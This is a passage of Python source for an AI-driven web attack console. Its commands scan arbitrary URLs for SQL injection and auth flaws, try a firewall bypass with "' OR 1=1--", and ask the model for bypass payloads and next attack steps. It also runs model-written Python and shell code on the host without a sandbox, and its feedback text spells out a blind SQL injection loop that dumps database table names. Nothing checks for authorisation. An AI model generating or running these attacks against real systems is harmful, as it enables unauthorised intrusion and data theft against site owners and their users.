            from ..i18n import set_lang as _set_lang
            _set_lang(lang)
        except Exception:
            pass
            self._success(self.s["lang_saved"])
        self.console.print(
            f"  [{THEME['dim']}]{self.s['lang_changed'].format(lang=SUPPORTED_LANGS[lang])}[/]"
        )

    def _cmd_model(self) -> None:
        from ..models.registry import BUILTIN_PROVIDERS
        from ..models.base import ModelConfig

        self.console.print(f"\n[{THEME['primary']}]{self.s['select_model']}[/]\n")

        # 기존 모델 목록
        if self.config.models:
            self.console.print(f"  [{THEME['secondary']}]{self.s['models_saved']}[/]")
            for i, m in enumerate(self.config.models, 1):
                mark = "✓" if m.display_name() == self.config.active_model else " "
                self.console.print(f"  [{THEME['primary']}]{mark} {i}[/] — {m.display_name()}")
            self.console.print()

        # 신규 추가
        providers = list(BUILTIN_PROVIDERS.items())
        self.console.print(f"  [{THEME['secondary']}]{self.s['models_add_new']}[/]")
        for i, (pid, info) in enumerate(providers, len(self.config.models) + 1):
            self.console.print(f"  [{THEME['dim']}]{i}[/] — {info['label']}")

        raw = Prompt.ask(f"\n[{THEME['primary']}]{self.s['select_number']}[/]").strip()
        try:
            idx = int(raw) - 1
        except ValueError:
            return

        # 기존 모델 전환
        if 0 <= idx < len(self.config.models):
            self.config.active_model = self.config.models[idx].display_name()
            self.config.save()
            self._success(self.s["model_saved"])
            return

        # 신규 등록
        new_idx = idx - len(self.config.models)
        if 0 <= new_idx < len(providers):
            pid, info = providers[new_idx]
            api_key = Prompt.ask(
                f"[{THEME['primary']}]{info['label']} {self.s['enter_api_key']}[/]",
                password=True,
            )
            default_url = info["base_url"]
            url_input = Prompt.ask(
                f"[{THEME['primary']}]{self.s['enter_base_url']}[/] [{THEME['dim']}]({default_url})[/]",
            ).strip()
            base_url = url_input or default_url

            default_model = info["default_model"]
            model_input = Prompt.ask(
                f"[{THEME['primary']}]{self.s['model_name_prompt']}[/] [{THEME['dim']}]({default_model})[/]",
            ).strip()
            model_name = model_input or default_model

            alias = Prompt.ask(
                f"[{THEME['primary']}]{self.s['alias_prompt']}[/]",
            ).strip()

            cfg = ModelConfig(
                provider=pid,
                model=model_name,
                api_key=api_key,
                base_url=base_url,
                alias=alias or "",
            )
            self.config.add_model(cfg)
            self.config.active_model = cfg.display_name()
            self.config.save()
            self._success(self.s["model_saved"])

    # ── 롤백 / 비용 명령어 ────────────────────────────────────────

    def _cmd_undo(self, steps: int = 1) -> None:
        """N단계 전 상태로 롤백."""
        snap = self._rollback.undo(steps)
        if not snap:
            self.console.print(f"[{THEME['warn']}]⚠ {self.s.get('undo_none', 'No snapshots')}[/]")
            return
        import copy
        self._agent_state = copy.deepcopy(snap.agent_state)
        self._save_agent_state()
        # 히스토리를 스냅샷 시점으로 되돌리기
        if snap.history_len < len(self.history):
            self.history = self.history[:snap.history_len]
        from rich.panel import Panel as _P
        self.console.print(_P(
            f"[green]✅ {self.s.get('undo_done', 'Rollback complete')}[/green]\n"
            f"[bold]{snap.label}[/bold]  ({snap.timestamp_str})\n"
            f"DB: {snap.agent_state.get('db_name', 'N/A')}  "
            f"Tables: {snap.agent_state.get('tables', [])}",
            title="[bold]UNDO[/bold]",
            border_style="green",
            expand=False,
        ))

    def _cmd_snapshots(self) -> None:
        """저장된 스냅샷 목록 출력."""
        from rich.table import Table as _T
        snaps = self._rollback.list_snapshots()
        if not snaps:
            self.console.print(f"[{THEME['dim']}]{self.s.get('snapshots_empty', 'No saved snapshots')}[/]")
            return
        t = _T(title="[bold]Snapshots[/bold]", border_style="cyan")
        t.add_column("#",     width=3)
        t.add_column("시각",  width=10)
        t.add_column("레이블")
        t.add_column("DB",    width=20)
        for i, s in enumerate(snaps):
            t.add_row(
                str(i+1),
                s.timestamp_str,
                s.label,
                s.agent_state.get("db_name") or "-",
            )
        self.console.print(t)
        self.console.print(f"[{THEME['dim']}]{self.s.get('undo_hint', '/undo 1 — go back 1 step')}[/]")

    def _cmd_cost(self) -> None:
        """현재 세션 토큰/비용 출력."""
        from rich.panel import Panel as _P
        u = self._token_usage
        self.console.print(_P(
            f"[cyan]Prompt tokens:[/cyan]     {u['prompt']:,}\n"
            f"[cyan]Completion tokens:[/cyan] {u['completion']:,}\n"
            f"[cyan]Total tokens:[/cyan]      {u['total']:,}\n"
            f"[bold yellow]Est. cost:[/bold yellow]         ${self._cost_usd:.4f}",
            title="[bold]Token Usage[/bold]",
            border_style="cyan",
            expand=False,
        ))

    def _show_token_usage(self) -> None:
        """루프마다 토큰 사용량 추정 + 상태바에 표시."""
        # 히스토리에서 토큰 추정 (실제 API 응답의 usage 필드가 없으면 추정)
        total_chars = sum(len(m.content) for m in self.history)
        est_tokens  = total_chars // 4  # 대략 4자 = 1토큰
        self._token_usage["total"] = est_tokens
        # 모델별 가격 추정 (DeepSeek: $0.14/1M tokens)
        self._cost_usd = est_tokens / 1_000_000 * 0.14
        self.console.print(
            f"[{THEME['dim']}]  💰 ~{est_tokens:,} tokens  ${self._cost_usd:.4f}[/]"
        )

    # ── Red Team 명령어 ───────────────────────────────────────────

    def _cmd_mscan(self, url: str = "") -> None:
        """멀티 에이전트 병렬 스캔 — Cursor처럼 전문 에이전트 동시 실행."""
        if not url:
            from rich.prompt import Prompt
            url = Prompt.ask(f"[{THEME['primary']}]타겟 URL[/]").strip()
        if not url:
            return

        from rich.panel import Panel as _Panel

        # 툴 자동 설치 확인
        with self.console.status(f"[cyan]{self.s.get('tool_init', 'Initializing tools...')}[/cyan]"):
            try:
                import shutil as _sh
                from pathlib import Path as _P
                _bingo_dir = _P.home() / ".bingo"
                _bingo_dir.mkdir(exist_ok=True)
                _tools_dir = _P(__file__).parent.parent / "tools"
                for _m in ["agent_tools.py", "recon_tools.py", "web_tools.py", "auth_tools.py"]:
                    _src = _tools_dir / _m
                    _dst = _bingo_dir / _m
                    if _src.exists():
                        _sh.copy2(str(_src), str(_dst))
            except Exception as _e:
                self.console.print(f"[dim]툴 설치 경고: {_e}[/dim]")

        self.console.print(_Panel(
            f"[bold cyan]🚀 {self.s.get('mscan_title', 'Multi-Agent Scan')}[/bold cyan]\n"
            f"[dim]{self.s.get('mscan_subtitle', 'Recon + SQLi + WebVuln + Auth — parallel')}[/dim]\n"
            f"[bold]{url}[/bold]",
            border_style="cyan",
            expand=False,
        ))

        from ..core.multi_agent import MultiAgent
        agent = MultiAgent(console=self.console)
        results = agent.run(url)

        # agent_state 업데이트 (SQLi 결과 반영)
        sqli = results.get("💉 SQLi") or {}
        if sqli.get("injectable"):
            self._agent_state["confirmed_sqli"] = True
            self._agent_state["db_name"]  = sqli.get("database")
            self._agent_state["tables"]   = sqli.get("tables", [])
            self._agent_state["waf"]      = sqli.get("waf")
            self._agent_state["target"]   = url
            self._save_agent_state()

        # 결과를 대화 컨텍스트에 주입 (AI가 이어서 작업 가능하게)
        import json
        summary = json.dumps(results, ensure_ascii=False, default=str)[:2000]
        self.history.append(Message(
            role="user",
            content=(
                f"=== MULTI-AGENT SCAN RESULTS for {url} ===\n"
                f"{summary}\n"
                f"=== END SCAN RESULTS ===\n"
                f"위 스캔 결과를 분석하고 발견된 취약점을 한국어로 요약해줘. "
                f"가장 심각한 것부터 정리하고, 다음 공격 단계를 추천해줘."
            )
        ))
        self._send_message("")

    def _cmd_scan(self, url: str = "") -> None:
        if not url:
            url = Prompt.ask(f"[{THEME['primary']}]{self.s['target_url_prompt']}[/]").strip()
        if not url:
            return

        self.console.print(f"\n[{THEME['error']}]{self.s['scan_title']}: {url}[/]")
        self.console.print(f"[{THEME['dim']}]{self.s['scan_hint'].format(url=url)}[/]\n")

        from ..tools.http_probe import HttpProbe
        from ..tools.waf_bypass import WafDetector
        from ..redteam.phases import __init__ as _  # noqa

        probe = HttpProbe(url, delay=0.3)

        # 빠른 정찰
        with self.console.status(f"[{THEME['secondary']}]{self.s['scan_recon']}[/]"):
            fp = probe.fingerprint()
            sensitive = probe.scan_sensitive_files()
            admin = probe.check_admin_panels()

            # WAF
            detector = WafDetector(probe)
            waf = detector.detect(url)

        # 결과 출력
        table = Table(title=f"[{THEME['primary']}]{self.s['scan_result_title']}[/]",
                      border_style=THEME["primary"], show_header=True)
        table.add_column(self.s["scan_col_item"], style=THEME["secondary"])
        table.add_column(self.s["scan_col_result"], style="white")

        table.add_row(self.s["scan_tech"], ", ".join(fp.get("tech", [])) or "-")
        table.add_row("CMS", fp.get("cms", "-"))
        table.add_row(self.s["scan_waf"], f"{waf.waf_type} ({waf.confidence})" if waf.detected else self.s["scan_waf_none"])
        table.add_row(self.s["scan_sensitive"], str(len(sensitive)))
        table.add_row(self.s["scan_admin"], str(len(admin)))
        self.console.print(table)

        if sensitive:
            self.console.print(f"\n[{THEME['error']}]{self.s['scan_sensitive_found']}:[/]")
            for s in sensitive[:5]:
                self.console.print(f"  [{THEME['warn']}]{s['path']}[/] [{s['status']}]")

        if admin:
            self.console.print(f"\n[{THEME['error']}]{self.s['scan_admin_found']}:[/]")
            for a in admin[:3]:
                self.console.print(f"  [{THEME['warn']}]{a['path']}[/] [{a['status']}]")

        self.console.print(f"\n[{THEME['dim']}]{self.s['scan_full_hint'].format(url=url)}[/]\n")

    def _cmd_waf(self, url: str = "") -> None:
        if not url:
            url = Prompt.ask(f"[{THEME['primary']}]{self.s['target_url_prompt']}[/]").strip()
        if not url:
            return

        from ..tools.http_probe import HttpProbe
        from ..tools.waf_bypass import WafDetector, WafBypassEngine

        self.console.print(f"\n[{THEME['warn']}]{self.s['waf_analyzing']}: {url}[/]")
        probe = HttpProbe(url)
        detector = WafDetector(probe)

        with self.console.status(f"[{THEME['warn']}]{self.s['waf_detecting']}[/]"):
            result = detector.detect(url)

        if result.detected:
            self.console.print(f"[{THEME['error']}]{self.s['waf_detected']}: {result.waf_type}  {self.s['waf_confidence']}: {result.confidence}[/]")
            self.console.print(f"[{THEME['dim']}]{self.s['waf_evidence']}: {result.evidence}[/]")
            self.console.print(f"\n[{THEME['secondary']}]{self.s['waf_priority']}:[/]")
            for i, s in enumerate(result.bypass_priority, 1):
                self.console.print(f"  {i}. {s}")

            self.console.print(f"\n[{THEME['warn']}]{self.s['waf_auto_bypass']}[/]")
            engine = WafBypassEngine(
                probe,
                on_progress=lambda m: self.console.print(f"[{THEME['dim']}]{m}[/]")
            )
            success, attempt = engine.auto_bypass(url + "?id=1", "' OR 1=1--")
            if success and attempt:
                self.console.print(f"[{THEME['success']}]{self.s['waf_bypass_ok']}: {attempt.technique}[/]")
                self.console.print(f"[{THEME['success']}]payload: {attempt.payload_modified}[/]")
            else:
                self.console.print(f"[{THEME['error']}]{self.s['waf_bypass_fail']}[/]")

            # AI에게 우회 전략 물어보기
            bypass_summary = engine.get_bypass_summary(result.waf_type)
            ai_prompt = (
                f"WAF detected: {result.waf_type}\n"
                f"Bypass attempts failed\n\n{bypass_summary}\n\n"
                f"Provide 5 optimal bypass payloads for this WAF."
            )
            self.console.print(f"\n[{THEME['secondary']}]{self.s['waf_ai_request']}[/]")
            self._stream_response(ai_prompt)
        else:
            self.console.print(f"[{THEME['success']}]{self.s['waf_none']}[/]")

    def _run_code_blocks(self, response: str, _loaded_skills: set) -> list[str]:
        """AI 응답에서 Python/Bash 블록 추출 후 병렬 실행.
        타임아웃 없음 — 성공할 때까지 실행. 모든 블록 동시 실행 후 결과 수집.
        """
        import re, subprocess, tempfile, os, threading
        from pathlib import Path
        from rich.markup import escape as _resc

        if "```" not in response:
            return []

        # ── agent_tools 자동 설치 (최초 1회) ─────────────────────────
        _tools_dst = Path.home() / ".bingo" / "agent_tools.py"
        if not _tools_dst.exists():
            try:
                import shutil as _sh
                _tools_src = Path(__file__).parent.parent / "tools" / "agent_tools.py"
                if _tools_src.exists():
                    _tools_dst.parent.mkdir(parents=True, exist_ok=True)
                    _sh.copy2(str(_tools_src), str(_tools_dst))
            except Exception:
                pass

        tmp_dir = Path(tempfile.gettempdir()) / "bingo_agent"
        tmp_dir.mkdir(exist_ok=True)

        # ── 실행할 작업 목록 수집 ─────────────────────────────────────
        tasks: list[dict] = []

        # ── 환각 감지 헬퍼 ──────────────────────────────────────────────
        def _detect_hallucination(raw_code: str) -> str | None:
            """JSON-in-code-block 또는 HTTP 호출 없는 가짜 코드 감지.
            문제가 없으면 None, 있으면 경고 메시지 반환."""
            s = raw_code.strip()
            # 패턴 1: 순수 JSON dict (import/def/print/requests 없음)
            if s.startswith("{") and s.endswith("}"):
                has_code = any(kw in s for kw in
                    ["import ", "def ", "class ", "requests.", "urllib", "print(", "httpx"])
                if not has_code:
                    return (
                        "JSON_DICT_NOT_CODE: Your code block contains only a JSON "
                        "dictionary, not Python. JSON cannot make HTTP requests. "
                        "Rewrite with: import requests; r=requests.get(url); print(r.status_code)"
                    )
            # 패턴 2: 5줄 미만 & 네트워크 호출 없음 & import 있음 → 의심
            lines = [l for l in s.splitlines() if l.strip() and not l.strip().startswith("#")]
            has_network = any(kw in s for kw in
                ["requests.", "urllib.", "httpx.", "socket.connect", "http.client",
                 "urlopen", "urlretrieve"])
            if len(lines) <= 3 and not has_network and "import" in s:
                return (
                    "STUB_CODE_NO_HTTP: Code has imports but NO HTTP calls "
                    "(requests.get/post). Add real HTTP requests."
                )
            return None

        # ── 코드 사전 검증 헬퍼 (SyntaxError / NameError 예방) ──────────
        def _precheck_python_code(code: str) -> str | None:
            """실행 전 Python 코드의 명백한 구문 오류 + 무한루프 패턴 감지.
            문제 없으면 None, 구문 수정 시 수정된 코드, 차단 시 특수 문자열 '__BLOCKED__:reason' 반환."""
            import ast as _ast
            import re as _pre_re

            fixed = code

            # 0. 무한루프 위험 패턴 감지 — 실행 전 차단
            #    패턴: for/while 루프 + SQL query + seen=set() 없음
            _has_loop = bool(_pre_re.search(r'\bfor\b.+\brange\s*\(', fixed) or _pre_re.search(r'\bwhile\s+True\b', fixed))
            _has_query = bool(_pre_re.search(r'(requests\.(get|post)|urllib|query|extract|inject|sqli)', fixed, _pre_re.IGNORECASE))
            _has_seen = bool(_pre_re.search(r'\bseen\s*=\s*set\s*\(', fixed))
            _has_top1_no_cursor = bool(
                _pre_re.search(r'TOP\s+1', fixed, _pre_re.IGNORECASE) and
                not _pre_re.search(r'name\s*>\s*(last|cursor|prev)', fixed, _pre_re.IGNORECASE) and
                not _pre_re.search(r'\bname\s*>\s*0x', fixed, _pre_re.IGNORECASE)
            )
            # FOR loop + DB query + TOP 1 without cursor + no seen set = infinite loop risk
            if _has_loop and _has_query and _has_top1_no_cursor and not _has_seen:
                return "__BLOCKED__:INFINITE_LOOP_RISK: for/range loop with TOP 1 query and no seen=set() will repeat same result forever"

            # 1. f-string 내 백슬래시 탐지 및 수정
            #    f"...\\'..."  또는  f"...{d['key']}..."  → 임시변수로 분리
            if _pre_re.search(r'f"[^"]*\\"[^"]*"', fixed) or _pre_re.search(r"f'[^']*\\'[^']*'", fixed):
                # 이 경우는 복잡해서 경고만
                pass

            # 2. py compile 으로 SyntaxError 체크
            try:
                compile(fixed, "<bingo_precheck>", "exec")
                return fixed  # 구문 OK
            except SyntaxError as _se:
                _line = _se.lineno or 0
                _lines = fixed.splitlines()
                # f-string 내 backslash 또는 dict subscript 오류 자동 수정 시도
                if _line > 0 and _line <= len(_lines):
                    bad_line = _lines[_line - 1]
                    # pattern: f"...val + \"'\"..."  →  quote = "'"; f"...val + {quote}..."
                    _fl_match = _pre_re.search(
                        r'(f["\'].*?)\\(["\'])(.*?["\'])',
                        bad_line
                    )
                    if _fl_match:
                        # fallback: escape 제거
                        _lines[_line - 1] = bad_line.replace("\\'", "'").replace('\\"', '"')
                        fixed = "\n".join(_lines)
                        try:
                            compile(fixed, "<bingo_precheck2>", "exec")
                            return fixed
                        except SyntaxError:
                            pass
                # 수정 실패 → 오류 메시지와 함께 None 반환해 caller가 재생성 요청하도록
                return None  # type: ignore

        python_blocks = re.findall(r"```python\s*(.*?)```", response, re.DOTALL)
        _hallucination_msgs: list[str] = []
        for i, block in enumerate(python_blocks):
            code = block.strip()
            if not code:
                continue

            # 환각 감지 — JSON 코드블록이면 건너뜀
            _hall = _detect_hallucination(code)
            if _hall:
                self.console.print(
                    f"[{THEME['error']}]⛔ [HALLUCINATION BLOCKED #{i+1}] {_hall[:120]}[/]"
                )
                _hallucination_msgs.append(_hall)
                continue

            # 구문 사전 검증 + 무한루프 패턴 차단
            _checked = _precheck_python_code(code)
            if isinstance(_checked, str) and _checked.startswith("__BLOCKED__:"):
                _block_reason = _checked[len("__BLOCKED__:"):]
                _loop_label = t("loop_block_label", "🚫 [LOOP BLOCK #{n}] {reason}").replace("{n}", str(i + 1)).replace("{reason}", _block_reason[:120])
                self.console.print(f"[bold red]{_loop_label}[/]")
                _hallucination_msgs.append(f"LOOP_BLOCKED: {_block_reason}")
                continue  # 이 코드블록 실행 건너뜀
            elif _checked is None:
                self.console.print(
                    f"[{THEME['warn']}]⚠ [SYNTAX PRECHECK #{i+1}] "
                    f"SyntaxError detected — auto-fix failed. "
                    f"Check f-string backslash or dict subscript issues.[/]"
                )
                # 그래도 실행 시도 (stderr에서 상세 오류가 출력됨)
            elif _checked != code:
                self.console.print(
                    f"[{THEME['secondary']}]🔧 [SYNTAX AUTO-FIX #{i+1}] Applied.[/]"
                )
                code = _checked

            tools_header = (
                "import sys as _sys, os as _os\n"
                "_sys.path.insert(0, _os.path.expanduser('~/.bingo'))\n"
            )
            if "agent_tools" not in code and "from agent_tools" not in code:
                code = tools_header + code
            script_path = tmp_dir / f"agent_script_{i}.py"
            script_path.write_text(code, encoding="utf-8")
            preview = " | ".join(l.strip() for l in code.splitlines()[:3] if l.strip())[:80]
            tasks.append({"type": "python", "idx": i, "path": str(script_path), "preview": preview})

        # 모든 블록이 환각으로 차단됐을 경우 → 강제 수정 메시지 반환
        if _hallucination_msgs and not tasks:
            _has_loop_block = any("LOOP_BLOCKED" in m for m in _hallucination_msgs)
            if _has_loop_block:
                _fb_title = t("loop_block_feedback_title", "⛔ CODE BLOCK REJECTED — INFINITE LOOP PATTERN DETECTED")
                _fb_rewrite = t("loop_block_mandatory_rewrite", "MANDATORY REWRITE — Use cursor pagination:")
                _fb_now = t("loop_block_rewrite_now", "Rewrite with the cursor pagination pattern above NOW.")
                _hall_feedback = (
                    f"[{_fb_title}]\n"
                    + "\n".join(f"  Block #{j+1}: {m}" for j, m in enumerate(_hallucination_msgs))
                    + "\n\nYour enumeration loop will print the SAME table name forever!\n"
                    "ROOT CAUSE: SELECT TOP 1 without cursor + no seen=set()\n\n"
                    f"{_fb_rewrite}\n"
                    "  seen = set()\n"
                    "  last_hex = ''\n"
                    "  while True:\n"
                    "      cursor_clause = f' AND name > {last_hex}' if last_hex else ''\n"
                    "      payload = f\"AND(1)=(SELECT TOP 1 name FROM sysobjects WHERE xtype=0x55{cursor_clause})\"\n"
                    "      result = extract_char_by_char(payload)  # your existing extract fn\n"
                    "      if not result or result in seen:\n"
                    "          break\n"
                    "      seen.add(result)\n"
                    "      last_hex = '0x' + result.encode().hex().upper()\n"
                    "      print(result)\n\n"
                    "DO NOT use: for i in range(N): query('SELECT TOP 1 name ... LIKE ...')\n"
                    f"{_fb_now}"
                )
            else:
                _hall_feedback = (
                    "[⛔ ALL CODE BLOCKS REJECTED — HALLUCINATION DETECTED]\n"
                    + "\n".join(f"  Block #{j+1}: {m}" for j, m in enumerate(_hallucination_msgs))
                    + "\n\nYou MUST rewrite ALL code blocks with REAL Python HTTP requests:\n"
                    "  import requests\n"
                    "  url = 'https://TARGET/endpoint'\n"
                    "  r = requests.get(url, timeout=10, verify=False, "
                    "headers={'User-Agent': 'Mozilla/5.0'})\n"
                    "  print(f'[STATUS] {r.status_code}  {url}')\n"
                    "  print(r.text[:500])\n"
                    "NO JSON. NO dict literals. Write actual HTTP code NOW."
                )
            return [_hall_feedback]

        bash_blocks = re.findall(r"```(?:bash|sh)\s*(.*?)```", response, re.DOTALL)
        _BASH_ALLOWED = {
            "curl", "nmap", "nikto", "ffuf", "gobuster", "nuclei",
            "httpx", "subfinder", "amass", "whatweb", "john", "hashcat",
            "python3", "python",
        }
        history_text = " ".join(m.content for m in self.history if m.role == "user")
        for block in bash_blocks:
            import shlex
            joined = block.strip().replace("\\\n", " ")
            lines = [l.strip() for l in joined.splitlines()
                     if l.strip() and not l.strip().startswith("#")]
            if not lines:
                continue
            cmd_line = " ".join(lines)
            try:
                parts = shlex.split(cmd_line)
            except Exception:
                continue
            if not parts or parts[0].split("/")[-1] not in _BASH_ALLOWED:
                continue
            if f"REAL EXECUTION: {cmd_line[:40]}" in history_text:
                continue
            tasks.append({"type": "bash", "cmd": cmd_line})

        if not tasks:
            return []

        # ── 병렬 실행 ────────────────────────────────────────────────
        results_text: list[str] = [""] * len(tasks)
        _lock = threading.Lock()

        def _run_task(task: dict, slot: int) -> None:
            try:
                if task["type"] == "python":
                    with _lock:
                        self.console.print(
                            f"\n[{THEME['secondary']}]▶ {self.s.get('python_exec', 'Python execution')} "
                            f"[#{task['idx']+1}]:[/] [{THEME['dim']}]{task['preview']}...[/]"
                        )
                    proc = subprocess.Popen(
                        ["python3", task["path"]],
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                        env={**os.environ, "PYTHONIOENCODING": "utf-8"},
                    )
                    stdout, stderr = proc.communicate()
                    output = (stdout.decode("utf-8", "replace") + stderr.decode("utf-8", "replace"))
                    if output.strip():
                        preview_out = "\n".join(output.strip().splitlines()[:60])
                        with _lock:
                            try:
                                self.console.print(f"[{THEME['dim']}]{_resc(preview_out)}[/]")
                            except Exception:
                                self.console.out(preview_out)
                        results_text[slot] = (
                            f"=== PYTHON EXECUTION (script_{task['idx']}) ===\n"
                            f"{output.strip()}\n=== EXIT: {proc.returncode} ==="
                        )
                    else:
                        results_text[slot] = (
                            f"=== PYTHON EXECUTION (script_{task['idx']}) ===\n"
                            f"(no output, exit={proc.returncode})"
                        )

                else:  # bash
                    with _lock:
                        self.console.print(
                            f"\n[{THEME['secondary']}]▶ {self.s['exec_running']}:[/] "
                            f"[{THEME['dim']}]{task['cmd'][:100]}[/]"
                        )
                    proc = subprocess.Popen(
                        task["cmd"], shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                    )
                    stdout, stderr = proc.communicate()
                    output = (stdout.decode("utf-8", "replace") + stderr.decode("utf-8", "replace"))
                    if output.strip():
                        preview_out = "\n".join(output.strip().splitlines()[:50])
                        with _lock:
                            self.console.print(f"[{THEME['dim']}]{_resc(preview_out)}[/]")
                        results_text[slot] = (
                            f"=== REAL EXECUTION: {task['cmd'][:80]} ===\n"
                            f"{output.strip()}\n=== EXIT CODE: {proc.returncode} ==="
                        )
                    else:
                        results_text[slot] = (
                            f"=== REAL EXECUTION: {task['cmd'][:80]} ===\n"
                            f"(no output, exit code {proc.returncode})"
                        )
            except Exception as e:
                with _lock:
                    self.console.print(f"[{THEME['error']}]  exec error:[/] {_resc(str(e))}")
                results_text[slot] = f"=== EXEC ERROR: {e} ==="

        # 프로세스 객체 저장 (소프트 타임아웃 시 종료용)
        procs: list = []
        _orig_run_task = _run_task

        proc_list_lock = threading.Lock()
        proc_registry: list = []

        def _tracked_run_task(task: dict, slot: int) -> None:
            """실시간 stdout 스트리밍 — print() 출력 즉시 화면에 표시."""
            try:
                env = {**os.environ, "PYTHONIOENCODING": "utf-8", "PYTHONUNBUFFERED": "1"}
                if task["type"] == "python":
                    p = subprocess.Popen(
                        ["python3", "-u", task["path"]],  # -u: unbuffered
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        env=env, bufsize=0,
                    )
                else:
                    p = subprocess.Popen(
                        task["cmd"], shell=True,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        env=env, bufsize=0,
                    )
                with proc_list_lock:
                    proc_registry.append(p)

                label = f"script_{task.get('idx', slot)}" if task["type"] == "python" else task["cmd"][:80]
                prefix = "PYTHON EXECUTION" if task["type"] == "python" else "REAL EXECUTION"
                all_lines: list[str] = []

                # 실시간 라인 스트리밍 — 중복 감지 + 타임아웃
                _consec_count = 0
                _last_stripped = None
                _killed_reason: str | None = None
                _start_ts = __import__("time").time()
                _SCRIPT_TIMEOUT = 300  # 스크립트당 최대 300초 (5분)
                _MAX_CONSEC_DUP = 5    # 동일 줄 5회 연속 → 루프 감지

                for raw_line in p.stdout:
                    line = raw_line.decode("utf-8", "replace").rstrip()
                    if not line:
                        continue
                    all_lines.append(line)
                    with _lock:
                        try:
                            self.console.print(f"[{THEME['dim']}]{_resc(line)}[/]")
                        except Exception:
                            self.console.out(line)

                    # 전체 타임아웃 체크
                    if __import__("time").time() - _start_ts > _SCRIPT_TIMEOUT:
                        _killed_reason = f"TIMEOUT_{_SCRIPT_TIMEOUT}s"
                        try:
                            p.terminate()
                        except Exception:
                            pass
                        break

                    # 연속 중복 감지
                    _cur = line.strip()
                    if _cur and _cur == _last_stripped:
                        _consec_count += 1
                        if _consec_count >= _MAX_CONSEC_DUP:
                            _killed_reason = f"INFINITE_LOOP:{_cur[:60]}"
                            with _lock:
                                _lang_lp = getattr(self.config, "lang", "en")
                                _lp_msg = {
                                    "ko": f"🔁 무한루프 감지: '{_cur[:40]}' {_consec_count}회 반복 → 강제 종료",
                                    "zh": f"🔁 检测到无限循环: '{_cur[:40]}' 重复{_consec_count}次 → 强制终止",
                                    "en": f"🔁 Infinite loop: '{_cur[:40]}' repeated {_consec_count}x → KILLED",
                                }.get(_lang_lp, f"🔁 Loop killed: '{_cur[:40]}'")
                                self.console.print(f"[bold red]{_lp_msg}[/]")
                            try:
                                p.terminate()
                            except Exception:
                                pass
                            break
                    else:
                        _consec_count = 0
                        _last_stripped = _cur

                try:
                    p.wait(timeout=5)
                except Exception:
                    try:
                        p.kill()
                    except Exception:
                        pass
                output = "\n".join(all_lines)
                _kill_suffix = ""
                if _killed_reason:
                    if _killed_reason.startswith("INFINITE_LOOP:"):
                        _dup_val = _killed_reason.split(":", 1)[1]
                        _k_title = t("script_killed_infinite", "[SCRIPT_KILLED: INFINITE_LOOP detected]")
                        _k_same = t("script_killed_same_val", "Same value '{val}' repeated {n}+ times.").replace("{val}", _dup_val).replace("{n}", str(_MAX_CONSEC_DUP))
                        _k_fix = t("script_killed_mandatory_fix", "MANDATORY FIX — Your enumeration loop has NO deduplication.")
                        _k_cursor = t("script_killed_cursor_must", "You MUST rewrite with cursor pagination pattern:")
                        _kill_suffix = (
                            f"\n{_k_title}\n"
                            f"{_k_same}\n"
                            f"{_k_fix}\n"
                            f"{_k_cursor}\n"
                            "  seen = set()\n"
                            "  last_hex = ''\n"
                            "  while True:\n"
                            "      if last_hex:\n"
                            "          payload = f'... AND name > {last_hex} ...'\n"
                            "      result = extract(payload)\n"
                            "      if not result or result in seen: break\n"
                            "      seen.add(result)\n"
                            "      last_hex = '0x' + result.encode().hex().upper()\n"
                            "STOP using FOR loops with TOP 1 and no cursor.\n"
                        )
                    else:
                        _k_timeout = t("script_killed_timeout", "[SCRIPT_KILLED: TIMEOUT]\nScript exceeded {sec}s timeout and was forcibly terminated.\nSplit the script into smaller blocks or optimize the loop.").replace("{sec}", str(_SCRIPT_TIMEOUT))
                        _kill_suffix = f"\n{_k_timeout}\n"
                if output.strip():
                    results_text[slot] = (
                        f"=== {prefix} ({label}) ===\n"
                        f"{output.strip()}\n"
                        f"=== EXIT: {p.returncode} ==={_kill_suffix}"
                    )
                else:
                    results_text[slot] = (
                        f"=== {prefix} ({label}) ===\n"
                        f"(no output, exit={p.returncode}){_kill_suffix}"
                    )
            except Exception as e:
                with _lock:
                    self.console.print(f"[{THEME['error']}]  exec error:[/] {_resc(str(e))}")
                results_text[slot] = f"=== EXEC ERROR: {e} ==="

        threads = [
            threading.Thread(target=_tracked_run_task, args=(task, i), daemon=True)
            for i, task in enumerate(tasks)
        ]
        for _th in threads:
            _th.start()

        # 30초마다 진행 상황 표시 + 10분 소프트 타임아웃
        _s = self.s
        self.console.print(
            f"[{THEME['dim']}]⏳ {_s.get('exec_parallel', 'Running')} "
            f"{len(threads)} {_s.get('exec_scripts', 'scripts in parallel')}...[/]"
        )

        HEARTBEAT = 30  # 30초마다 상태 표시
        elapsed = 0
        while any(_th.is_alive() for _th in threads):
            for _th in threads:
                _th.join(timeout=HEARTBEAT)
            elapsed += HEARTBEAT
            if any(_th.is_alive() for _th in threads):
                self.console.print(
                    f"[{THEME['dim']}]  ⏱ {elapsed}s {_s.get('exec_running', 'running')}...[/]"
                )
            # Ctrl+C 감지 시 현재까지 결과 수집 후 종료
            if self._agent_stop_flag.is_set():
                self.console.print(
                    f"[{THEME['warn']}]⚠ {_s.get('exec_timeout_soft', 'Interrupted — collecting partial results')}[/]"
                )
                with proc_list_lock:
                    for p in proc_registry:
                        try:
                            p.terminate()
                        except Exception:
                            pass
                for _th in threads:
                    _th.join(timeout=5)
                for i, r in enumerate(results_text):
                    if not r:
                        results_text[i] = "=== INTERRUPTED — partial results only ==="
                break

        return [r for r in results_text if r]

    def _execute_ai_commands(
        self,
        response: str,
        _depth: int = 0,
        _loaded_skills: set | None = None,
    ) -> None:
        """
        AI가 ```python / ```bash 블록을 제시하면 실행하고 결과를 피드백.
        재귀 호출 없이 while 루프로 동작 — Python 콜 스택 쌓이지 않음.
        SKILL_LOAD 체인은 depth로 제한(별도 로직).
        """
        from ..models.registry import ModelRegistry

        if _loaded_skills is None:
            _loaded_skills = set()

        # ── SKILL_LOAD: depth 기반 제한 (스킬 체인 전용) ──────────────
        if _depth > 30:
            self._suggest_next_steps()
            return

        skill_names = self._parse_skill_load_request(response)
        new_skills = [s for s in skill_names if s not in _loaded_skills]
        if new_skills:
            _loaded_skills.update(new_skills)
            skill_content = self._load_skill_content(new_skills)
            if skill_content:
                self.history.append(Message(
                    role="user",
                    content=(
